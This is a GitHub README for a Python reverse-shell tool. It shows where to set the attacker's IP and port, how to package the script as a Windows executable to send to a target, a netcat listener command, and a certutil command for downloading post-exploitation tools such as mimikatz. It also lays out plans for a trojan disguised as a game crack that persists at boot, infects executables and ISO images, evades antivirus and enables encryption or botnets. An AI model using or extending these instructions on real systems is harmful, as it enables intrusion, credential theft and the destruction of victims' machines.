<h1 align="center">Reverse shell payload only using python</h1>

<p align="center">
<a href="#"><img alt="reverseshellpy forks" src="https://img.shields.io/github/forks/cdkw/reverseshellpy?style=for-the-badge"></a>
<a href="#"><img alt="reverseshellpy last commit (main)" src="https://img.shields.io/github/last-commit/cdkw/reverseshellpy/main?color=green&style=for-the-badge"></a>
<a href="#"><img alt="reverseshellpy Repo stars" src="https://img.shields.io/github/stars/cdkw/reverseshellpy?style=for-the-badge&color=yellow"></a>
<a href="#"><img alt="reverseshellpy License" src="https://img.shields.io/github/license/cdkw/reverseshellpy?color=orange&style=for-the-badge"></a>
<a href="https://github.com/cdkw/reverseshellpy/issues"><img alt="reverseshellpy issues" src="https://img.shields.io/github/issues/cdkw/reverseshellpy?color=purple&style=for-the-badge"></a>

<p align="center">Do not attack anyone without their consent. Made for educational purposes only.</p>
<p align="center"><img src="https://i.imgur.com/uKFy6zZ.png" alt="SCRIPT"></p>


# Usage:

Replace in the python file the ip and port of your netcat reverse shell server. (tutorial on that below)
```py
def main():
    server_ip = '127.0.0.1'  # Replace with the server's IP address
    server_port = 9001       # Replace with the same port number used on the server
```


Then using auto_py_to_exe or py_to_exe make it an executable. Note that this did not work on kali linux for me.
```
pip install auto-py-to-exe
python -m auto_py_to_exe
```

Select the `Script Location`, then choose `One file`, then choose `window based`. Add an icon if you want, or extra files like mimikatz.exe embedded into it (requires your own code). Then `Convert .py to .exe`. Open the folder you were in when u typed `python -m auto_py_to_exe` and go into `output`, in this folder you will find your exe file.

Now, just send it to your other machine. 
`Note that this is not obfuscated or made to be used with any tunnel to hide the server's ip.`

# Netcat Server

Open a terminal in a machine that has installed netcat (ncat, nc), for example u can get it while installing nmap for windows. 
In the terminal, type `nc -lvp <PORT>`, replacing `<PORT>` with the port you have chosen for your listener.

# Post-exploitation:

After gaining access to your target, you can use `certutil` (`certutil -urlcache -split -f https://www.example.com/example.zip C:\path\to\file`, it being located in the system32 folder) or the embedded `--wget` function of the rs.py to download post-exploitation tools like priviledge exploitation with `mimikatz.exe`.

# PLANS / WORKING ON / NOT ADDED YET :
This "virus" will be organised in 3 stages.

Once ran, it works like the app that it was advertised, for this example we will say that the app it was supposed to be is a crack for gta 5. The app starts normally and works normally, but the "malicious" code is first checking for its permissions, it starts by starting a reverse shell tunnel to the attacker (using embedded tunnel like ngrok).


Stage 1. ```It starts by analyzing its permissions, and replacing good .exe files with infected ones. It adds itself to boot menu and slowly infects everything that it finds from its database. While keeping itself hidden from malware detection.```

Stage 2. ```It adds itself to boot menu and chooses an app like Microsoft Edge to embed itself into it. It's now infecting every executable file in your system. Its goal now is to achieve administrator permissions and to infect the system32.```

Stage 3. ```At this point, damage is irreversible. And antivirus can be shut down at any time, for the system to be encrypted, or used for other purposes that the attacker might like, for example, botnets or crypto mining. Topping to that, .iso files will be natively infected with the same virus, working on all types of images```

Disclaimer that these are only future plans, stuff might change. For now its only a simple local hosted reverse shell. 



